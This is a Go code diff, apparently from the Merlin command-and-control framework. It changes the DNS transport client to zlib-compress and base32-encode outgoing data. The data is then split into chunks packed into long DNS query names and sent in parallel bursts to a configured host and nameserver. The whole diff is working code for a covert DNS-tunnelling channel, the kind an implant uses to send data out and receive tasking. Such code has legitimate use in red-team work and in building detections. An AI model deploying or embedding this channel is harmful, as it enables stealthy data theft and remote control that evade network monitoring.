@@ -2,6 +2,7 @@ package dns
 
 import (
 	"bytes"
+	"compress/zlib"
 	"crypto/rand"
 	"encoding/base32"
 	"encoding/base64"
@@ -82,9 +83,21 @@ func (h DNSCommClient) Do(b io.Reader) (transport.MerlinResponse, error) {
 	if e != nil {
 		return transport.MerlinResponse{}, e
 	}
+	//compress
+	var zb *bytes.Buffer
+	zb = &bytes.Buffer{}
+	z := zlib.NewWriter(zb)
+	z.Write(byts)
+	z.Close()
+
+	byts, e = ioutil.ReadAll(zb)
+
+	if e != nil {
+		return transport.MerlinResponse{}, e
+	}
+
 	//convert to base32
 	payloadFull := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(byts)
-
 	chunks := len(payloadFull) / chunklen
 	leftover := len(payloadFull) % chunklen
 
@@ -94,15 +107,17 @@ func (h DNSCommClient) Do(b io.Reader) (transport.MerlinResponse, error) {
 
 	rb := make([]byte, 8)
 	rand.Read(rb)
-
 	cmdID := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(rb)
+
+	reqs := h.buildReqs(payloadFull, cmdID)
+
 	wg := &sync.WaitGroup{}
 	ch := make(chan transport.MerlinResponse, 2)
-	limiter := make(chan struct{}, 500) //only send 200 queries at once
-	for thisChunk := 1; thisChunk <= chunks; thisChunk++ {
+	limiter := make(chan struct{}, 1000) //only send 1k queries at once
+	for i, req := range reqs {
 		limiter <- struct{}{}
 		wg.Add(1)
-		go h.sendChunk(wg, thisChunk, chunks, payloadFull, cmdID, ch, limiter)
+		go h.sendChunk(wg, i, len(reqs), req, cmdID, ch, limiter)
 
 	}
 	wg.Wait()
@@ -113,16 +128,64 @@ func (h DNSCommClient) Do(b io.Reader) (transport.MerlinResponse, error) {
 	return ret, nil
 }
 
-func (h *DNSCommClient) sendChunk(wg *sync.WaitGroup, thisChunk, chunks int, payloadFull, cmdID string, ch chan transport.MerlinResponse, limiter chan struct{}) {
+func (h *DNSCommClient) buildReqs(s, cmdID string) []string {
+	//determine how many chunks exist
+	chunks := len(s) / chunklen
+	leftover := len(s) % chunklen
+
+	if leftover > 0 {
+		chunks++
+	}
+
+	//build a slice of all chunks
+	slchunks := []string{}
+	for thisChunk := 1; thisChunk <= chunks; thisChunk++ {
+		min := (thisChunk - 1) * chunklen
+		max := thisChunk * chunklen
+		if max > len(s) {
+			max = len(s)
+		}
+		slchunks = append(slchunks, s[min:max])
+	}
+
+	//maximum len of dns record is 250
+	recLen := 250
+
+	//less the host suffix
+	recLen = recLen - (len(h.Host) + 1) //(adding for dot)
+
+	//less the cmdID
+	recLen = recLen - (len(cmdID) + 1) //(adding for dot)
+
+	//less the width of max chunks parameter (times two, for the thischunk parameter)
+	recLen = recLen - ((len(fmt.Sprintf("%x", chunks)) + 1) * 2)
+
+	//concat chunks while length is below 200-(len(h.host)+len(cmdID))
+	ret := []string{}
+	sb := ""
+	for _, chunk := range slchunks {
+		if len(sb) == 0 {
+			sb = chunk
+			continue
+		}
+		if len(sb+"."+chunk) < recLen {
+			sb = sb + "." + chunk
+		} else {
+			ret = append(ret, sb)
+			sb = chunk
+		}
+	}
+	if sb != "" {
+		ret = append(ret, sb)
+	}
+	return ret
+}
+
+func (h *DNSCommClient) sendChunk(wg *sync.WaitGroup, thisChunk, chunks int, req, cmdID string, ch chan transport.MerlinResponse, limiter chan struct{}) {
 	defer wg.Done()
 	defer func() { <-limiter }()
-	min := (thisChunk - 1) * chunklen
-	max := thisChunk * chunklen
-	if max > len(payloadFull) {
-		max = len(payloadFull)
-	}
-	payload := payloadFull[min:max]
-	lookupAddr := fmt.Sprintf("%s.%d.%d.%s.%s", payload, thisChunk, chunks, cmdID, h.Host)
+
+	lookupAddr := fmt.Sprintf("%s.%x.%x.%s.%s", req, thisChunk+1, chunks, cmdID, h.Host)
 	for {
 
 		rsp, err := aLookup(lookupAddr, h.NS) //net.LookupIP(lookupAddr)
